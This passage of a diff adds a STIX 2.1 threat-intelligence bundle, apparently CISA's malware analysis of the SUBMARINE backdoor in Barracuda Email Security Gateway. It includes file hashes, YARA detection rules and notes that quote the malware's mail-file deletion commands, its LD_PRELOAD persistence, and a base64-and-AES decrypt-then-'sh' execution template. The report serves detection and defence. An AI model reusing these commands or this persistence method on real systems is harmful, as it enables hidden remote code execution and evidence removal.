}\n\tcondition:\n\t\tfilesize < 2KB and 6 of them\n}\n",
+            "pattern_type": "yara",
+            "valid_from": "2023-07-27T20:32:41.745704Z"
+        },
+        {
+            "type": "note",
+            "spec_version": "2.1",
+            "id": "note--24b625b4-f3b6-4f83-9893-a42cc0685762",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:07.000Z",
+            "modified": "2023-05-31T22:05:07.000Z",
+            "content": "The file 'hw-set' is a SUBMARINE artifact. The file is a shell script located in the '/boot/os_tools/' directory and contains shell commands as well as a base64 encoded string (Figure 5). The shell script is set to sleep for 2 minutes prior to execution. The 'grep' command checks if the string 'LD_PRELOAD' is contained within the 'smtpctl' file located at '/home/product/code/firmware/current/sbin/'. The exclamation point (!) prepending the script is used to check for success or failure of the 'grep' command. If the string 'LD_PRELOAD' is not identified, a base64 encoded 'sed' command is used to modify the 'smtpctl' file (Figure 6).",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "object_refs": [
+                "file--149c0c97-1a85-56ae-8418-4eab1ee2069e"
+            ]
+        },
+        {
+            "type": "file",
+            "spec_version": "2.1",
+            "id": "file--c300b874-0a17-534d-9022-39756f7eacf7",
+            "hashes": {
+                "MD5": "35a432e40da597c7ab63ff16b09d19d8",
+                "SHA-1": "b798b881b89526051ee5d50f24239b3a952c9724",
+                "SHA-256": "cc131dd1976a47ee3b631a136c3224a138716e9053e04d8bea3ee2e2c5de451a",
+                "SHA-512": "af6aa47f44e604a60930f122ebd47d6c1b83c756b005d79ade8af147bfbfab40f16ba91e32021d65b18b21e06911476fb5d03f050850c8300d1e7d7a3e61c36b",
+                "SSDEEP": "48:t7c4VFuL2/zkanTvNpofcgBnY5NBFTGc5FjJWgkFBhhkQ1jtbA5lwmNdBITf3K3M:xcOko1iyGc6FzKAjDTvssgRaI7Q"
+            },
+            "size": 3759,
+            "name": "smtpctl",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ]
+        },
+        {
+            "type": "indicator",
+            "spec_version": "2.1",
+            "id": "indicator--0d52c485-52a3-4264-b367-679139d91a65",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:07.000Z",
+            "modified": "2023-05-31T22:05:07.000Z",
+            "name": "smtpctl",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "description": "The file 'smtpctl' is a SUBMARINE loader. The file is a maliciously modified shell script used to remove mail files in 2 directories as well as load SUBMARINE as a shared library for the Batched Simple Mail Transfer Protocol (BSMTP) daemon.  \r\n\r\n~Begin File Removal Commands~\r\nrm -f /mail/scan/body*\r\nrm -f /mail/tmp/mimeattach.*\r\n~End File Removal Commands~\r\n\r\nAppended malicious code at the bottom of 'smtpctl.sh' sets the BSMTP_ID and SUBMARINE is preloaded as a shared library from the '/boot/os_tools' directory. It then executes the BSMTP daemon. If the BSMTPD_PID variable is set, debug mode is enabled. If the BSMTPD_PID variable is not set, execution continues without enabling debug mode. Additionally, any instances of the string 'reload' in the command are replaced with 'restart' and all errors are redirected to '/dev/null' (Figure 7).",
+            "indicator_types": [
+                "malicious-activity"
+            ],
+            "pattern": " 'namespace'='CISA_Consolidated.yara' rule_name=CISA_10454006_05 rule_content=rule CISA_10454006_05 : SUBMARINE trojan backdoor remote_access_trojan compromises_data_integrity cleans_traces_of_infection hides_artifacts installs_other_components remote_access exploitation\n{\n\tmeta:\n\t\tAuthor = \"CISA Code & Media Analysis\"\n\t\tIncident = \"10454006\"\n\t\tDate = \"2023-07-05\"\n\t\tLast_Modified = \"20230711_1500\"\n\t\tActor = \"n/a\"\n\t\tFamily = \"SUBMARINE\"\n\t\tCapabilities = \"compromises-data-integrity cleans-traces-of-infection hides-artifacts installs-other-components\"\n\t\tMalware_Type = \"trojan backdoor remote-access-trojan\"\n\t\tTool_Type = \"remote-access exploitation\"\n\t\tDescription = \"Detects SUBMARINE launcher script samples\"\n\t\tSHA256_1 = \"cc131dd1976a47ee3b631a136c3224a138716e9053e04d8bea3ee2e2c5de451a\"\n\tstrings:\n\t\t$s1 = { 4c 44 5f 50 52 45 4c 4f 41 44 }\n\t\t$s2 = { 23 21 20 2f 62 69 6e 2f 73 68 }\n\t\t$s3 = { 4c 44 5f 50 52 45 4c 4f 41 44 3d 2f 62 6f 6f 74 2f 6f 73 5f 74 6f 6f 6c 73 2f 6c 69 62 75 74 69 6c 2e 73 6f 20 65 78 65 63 }\n\t\t$s4 = { 3e 2f 64 65 76 2f 6e 75 6c 6c 20 32 3e 26 31 }\n\t\t$s5 = { 62 73 6d 74 70 64 20 63 6f 6e 74 72 6f 6c 20 73 63 72 69 70 74 }\n\t\t$s6 = { 42 53 4d 54 50 44 5f 50 49 44 }\n\t\t$s7 = { 2f 72 65 6c 6f 61 64 2f 72 65 73 74 61 72 74 }\n\tcondition:\n\t\tfilesize < 6KB and 6 of them\n}\n",
+            "pattern_type": "yara",
+            "valid_from": "2023-07-27T20:32:41.762221Z"
+        },
+        {
+            "type": "note",
+            "spec_version": "2.1",
+            "id": "note--7b4b251b-a673-410e-950b-798f8d89bce4",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:07.000Z",
+            "modified": "2023-05-31T22:05:07.000Z",
+            "content": "The file 'smtpctl' is a SUBMARINE loader. The file is a maliciously modified shell script used to remove mail files in 2 directories as well as load SUBMARINE as a shared library for the Batched Simple Mail Transfer Protocol (BSMTP) daemon.  \r\n\r\n~Begin File Removal Commands~\r\nrm -f /mail/scan/body*\r\nrm -f /mail/tmp/mimeattach.*\r\n~End File Removal Commands~\r\n\r\nAppended malicious code at the bottom of 'smtpctl.sh' sets the BSMTP_ID and SUBMARINE is preloaded as a shared library from the '/boot/os_tools' directory. It then executes the BSMTP daemon. If the BSMTPD_PID variable is set, debug mode is enabled. If the BSMTPD_PID variable is not set, execution continues without enabling debug mode. Additionally, any instances of the string 'reload' in the command are replaced with 'restart' and all errors are redirected to '/dev/null' (Figure 7).",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "object_refs": [
+                "file--c300b874-0a17-534d-9022-39756f7eacf7"
+            ]
+        },
+        {
+            "type": "file",
+            "spec_version": "2.1",
+            "id": "file--4b488175-6aec-5e5a-b453-5ea8b6114b75",
+            "hashes": {
+                "MD5": "b745626b36b841ed03eddfb08e6bb061",
+                "SHA-1": "cb20b167795db258b307ddee91ded87a9e7562d0",
+                "SHA-256": "81cf3b162a4fe1f1b916021ec652ade4a14df808021eeb9f7c81c8d2326bddab",
+                "SHA-512": "d6b9dfc9b784ca76386cbbf2c75c7e0ad3ac45e4420a838bc21b1464d07208f46901d7a0c8fbeca90303ce48720d7fd60b76d25cfebf5ea5b385e6b9db10ed98",
+                "SSDEEP": "96:dVdsadO5BT/aucX3Qa/c2D1UKDUzW1MuBFQC0NysEuSobXoWhP:yadO5B71cX3Qgc2uKD+aMLC01EuSo"
+            },
+            "size": 9396,
+            "name": "libutil.so",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ]
+        },
+        {
+            "type": "indicator",
+            "spec_version": "2.1",
+            "id": "indicator--4a9ebd1d-e563-467a-a08f-08418b29ac02",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:07.000Z",
+            "modified": "2023-05-31T22:05:07.000Z",
+            "name": "libutil.so",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "description": "The file 'libutil.so' is the SUBMARINE payload. 'libutil.so' is preloaded into the BSMTP daemon, the Linux executable responsible for receiving emails, and processing Simple Mail Transfer Protocol (SMTP) reply messages. Linux Shared Object Preloading is analogous to Dynamic-Link Library (DLL) side loading and DLL injection in the Windows OS.\r\n\r\nThis file is preloaded using the 'LD_PRELOAD' parameter, applied to 'bsmtpd', the BSMTP daemon executable.  The preload parameter is added to two configuration files, files that control the behavior of 'bsmtpd.'  When the configuration files restart the daemon, 'libutil.so' is loaded into its process memory, giving it the same privileges and access as 'bsmtpd.'\r\n\r\nThe malware obtains the BSMTP_ID environment variable from the infected system. The BSMTP_ID has the capacity to be used as a port for malicious traffic. (Figure 8).  The process this shared object file is running in, 'bsmtpd', is duplicated and launched using the 'fork' Linux function (Figure 9). The malware opens a connection to 127.0.0.1 on the victim machine it is running on (Figure 10). The 'recv' function is called after the connection is opened, showing that the malware has the capacity to obtain information from the context/environment its executed on.\r\n\r\nFigure 11, Pane 1, shows configuration settings for the BSMTP daemon, that allows any email traffic for the address range of 127/8 and multiple actions including 'ehlo.' Pane 2 shows the malware intaking data, and loading the 'ehlo' action into memory.\r\n\r\nFigure 12, Pane 1, shows the malware, in conjunction with 'snprintf_chk', printing the string 'echo -n '%s' | base64 -d | openssl aes-256-cbc -d -K 66833b26%d -iv 69822b6c%d 2>/dev/null | sh', to the Linux shell. The string is a command that accepts input '%s', decodes it with Base64, decrypts it with AES, pipes errors to std_out and executes it on the target with the 'sh' bash command and 'system' Linux function. Lastly, the malware has the capacity to print the SMTP string, '250-mail2.eccentric.duck Hello %s [%s], pleased to meet you' . Therefore, given this information, the malware has the capacity to accept encoded and encrypted inputs from 'bsmtpd', execute them, and print a message.",
+            "indicator_types": [
+                "malicious-activity"
+            ],
+            "pattern": " 'namespace'='CISA_Consolidated.yara' rule_name=CISA_10454006_01 rule_content=rule CISA_10454006_01 : SUBMARINE trojan backdoor remote_access_trojan remote_access information_gathering exploitation determines_c2_server controls_local_machine compromises_data_integrity\n{\n\tmeta:\n\t\tAuthor = \"CISA Code & Media Analysis\"\n\t\tIncident = \"10452108\"\n\t\tDate = \"2023-06-29\"\n\t\tLast_Modified = \"20230711_1500\"\n\t\tActor = \"n/a\"\n\t\tFamily = \"SUBMARINE\"\n\t\tCapabilities = \"determines-c2-server controls-local-machine compromises-data-integrity\"\n\t\tMalware_Type = \"trojan backdoor remote-access-trojan\"\n\t\tTool_Type = \"remote-access information-gathering exploitation\"\n\t\tDescription = \"Detects SUBMARINE Barracuda backdoor samples\"\n\t\tSHA256_1 = \"81cf3b162a4fe1f1b916021ec652ade4a14df808021eeb9f7c81c8d2326bddab\"\n\tstrings:\n\t\t$s1 = { 32 35 30 2d 6d 61 69 6c 32 2e 65 63 63 65 6e 74 72 69 63 2e 64 75 63 6b }\n\t\t$s2 = { 6f 70 65 6e 73 73 6c 20 61 65 73 2d 32 35 36 }\n\t\t$s3 = { 65 63 68 6f 20 2d 6e 20 27 25 73 27 20 7c 20 62 61 73 65 36 34 20 2d 64 }\n\t\t$s4 = { 2d 69 76 }\n\t\t$s5 = { 48 65 6c 6c 6f 20 25 73 20 5b 25 73 5d 2c 20 70 6c 65 61 73 65 64 20 74 6f 20 6d 65 65 74 20 79 6f 75 }\n\t\t$s6 = { e8 47 fa ff }\n\t\t$s7 = { 63 6f 6d 6d 61 6e 64 }\n\t\t$s8 = { 2d 69 76 20 36 39 38 32 32 62 36 63 }\n\t\t$s9 = { 73 65 6e 64 }\n\t\t$s10 = { 73 6f 63 6B 65 74 }\n\t\t$s11 = { 63 6f 6e 6e 65 63 74 }\n\tcondition:\n\t\tfilesize < 15KB and 8 of them\n}\n",
+            "pattern_type": "yara",
+            "valid_from": "2023-07-27T20:32:41.778107Z"
+        },
+        {
+            "type": "note",
+            "spec_version": "2.1",
+            "id": "note--4fb388e1-8e3f-4ee2-9a3c-1608a5b69a14",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:07.000Z",
+            "modified": "2023-05-31T22:05:07.000Z",
+            "content": "The file 'libutil.so' is the SUBMARINE payload. 'libutil.so' is preloaded into the BSMTP daemon, the Linux executable responsible for receiving emails, and processing Simple Mail Transfer Protocol (SMTP) reply messages. Linux Shared Object Preloading is analogous to Dynamic-Link Library (DLL) side loading and DLL injection in the Windows OS.\r\n\r\nThis file is preloaded using the 'LD_PRELOAD' parameter, applied to 'bsmtpd', the BSMTP daemon executable.  The preload parameter is added to two configuration files, files that control the behavior of 'bsmtpd.'  When the configuration files restart the daemon, 'libutil.so' is loaded into its process memory, giving it the same privileges and access as 'bsmtpd.'\r\n\r\nThe malware obtains the BSMTP_ID environment variable from the infected system. The BSMTP_ID has the capacity to be used as a port for malicious traffic. (Figure 8).  The process this shared object file is running in, 'bsmtpd', is duplicated and launched using the 'fork' Linux function (Figure 9). The malware opens a connection to 127.0.0.1 on the victim machine it is running on (Figure 10). The 'recv' function is called after the connection is opened, showing that the malware has the capacity to obtain information from the context/environment its executed on.\r\n\r\nFigure 11, Pane 1, shows configuration settings for the BSMTP daemon, that allows any email traffic for the address range of 127/8 and multiple actions including 'ehlo.' Pane 2 shows the malware intaking data, and loading the 'ehlo' action into memory.\r\n\r\nFigure 12, Pane 1, shows the malware, in conjunction with 'snprintf_chk', printing the string 'echo -n '%s' | base64 -d | openssl aes-256-cbc -d -K 66833b26%d -iv 69822b6c%d 2>/dev/null | sh', to the Linux shell. The string is a command that accepts input '%s', decodes it with Base64, decrypts it with AES, pipes errors to std_out and executes it on the target with the 'sh' bash command and 'system' Linux function. Lastly, the malware has the capacity to print the SMTP string, '250-mail2.eccentric.duck Hello %s [%s], pleased to meet you' . Therefore, given this information, the malware has the capacity to accept encoded and encrypted inputs from 'bsmtpd', execute them, and print a message.",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "object_refs": [
+                "file--4b488175-6aec-5e5a-b453-5ea8b6114b75"
+            ]
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--601eeffb-38ed-4801-acbd-bd95b86aa19a",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:07.000Z",
+            "modified": "2023-05-31T22:05:07.000Z",
+            "relationship_type": "related-to",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "source_ref": "file--1f40b2e4-ef40-5ea5-b24f-d20dda72c833",
+            "target_ref": "file--4b488175-6aec-5e5a-b453-5ea8b6114b75"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--0f9dc8a5-4fcc-4a02-ac3f-969a5b0c65ef",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:07.000Z",
+            "modified": "2023-05-31T22:05:07.000Z",
+            "relationship_type": "related-to",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "source_ref": "file--1f40b2e4-ef40-5ea5-b24f-d20dda72c833",
+            "target_ref": "file--25910ba1-5215-55ac-933c-5d78f50d0dd6"
+        },
+        {
+            "type": "report",
+            "spec_version": "2.1",
+            "id": "report--6f5bc7a6-06a4-41d7-8374-87704327562f",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:07.000Z",
+            "modified": "2023-07-27T20:32:41.806049Z",
+            "name": "MAR-10454006.r1.v2",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "description": "CISA obtained seven malware samples related to a novel backdoor CISA has named SUBMARINE. The malware was used by threat actors exploiting CVE-2023-2868, a former zero-day vulnerability affecting certain versions 5.1.3.001 - 9.2.0.006 of Barracuda Email Security Gateway (ESG). \r\n\r\nSUBMARINE is a novel persistent backdoor that lives in a Structured Query Language (SQL) database on the ESG appliance. SUBMARINE comprises multiple artifacts that, in a multi-step process, enable execution with root privileges, persistence, command and control, and cleanup.  In addition to SUBMARINE, CISA obtained associated Multipurpose Internet Mail Extensions (MIME) attachment files from the victim. These files contained the contents of the compromised SQL database, which included sensitive information.\r\n\r\nFor information about related malware, specifically information on the initial exploit payload and other backdoors, see CISA Alert: CISA Releases Malware Analysis Reports on Barracuda Backdoors. ",
+            "report_types": [
+                "observed-data"
+            ],
+            "published": "2023-05-31T22:05:07Z",
+            "object_refs": [
+                "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+                "file--ad9136cf-ceed-5339-87b4-459fa22a51c7",
+                "indicator--f9df024e-db1d-4943-a95c-a73ef46c37e1",
+                "note--fa64925d-26d4-4437-8c74-9a0e4c468530",
+                "file--b811e25b-1e94-5de7-a99f-ff509bb7cf07",
+                "indicator--f5d0acf7-6700-456c-97f1-ab1c3d01c08d",
+                "note--70cba764-b7e8-4183-bded-455bdc844aae",
+                "file--1f40b2e4-ef40-5ea5-b24f-d20dda72c833",
+                "indicator--4a50e72e-c50a-49c2-9dfe-7269d81206a9",
+                "note--e4045a09-39aa-4a8b-8af5-57bcd41a08df",
+                "file--25910ba1-5215-55ac-933c-5d78f50d0dd6",
+                "indicator--168a661e-ebd2-4d1e-b9b2-1030b8f70d4d",
+                "note--94938b65-d053-4a05-bb38-605abd8f11a5",
+                "file--149c0c97-1a85-56ae-8418-4eab1ee2069e",
+                "indicator--1c436118-98e8-4ff0-af4b-0dc0ff9e8b94",
+                "note--24b625b4-f3b6-4f83-9893-a42cc0685762",
+                "file--c300b874-0a17-534d-9022-39756f7eacf7",
+                "indicator--0d52c485-52a3-4264-b367-679139d91a65",
+                "note--7b4b251b-a673-410e-950b-798f8d89bce4",
+                "file--4b488175-6aec-5e5a-b453-5ea8b6114b75",
+                "indicator--4a9ebd1d-e563-467a-a08f-08418b29ac02",
+                "note--4fb388e1-8e3f-4ee2-9a3c-1608a5b69a14",
+                "relationship--601eeffb-38ed-4801-acbd-bd95b86aa19a",
+                "relationship--0f9dc8a5-4fcc-4a02-ac3f-969a5b0c65ef"
+            ]
+        }
+    ]
+}
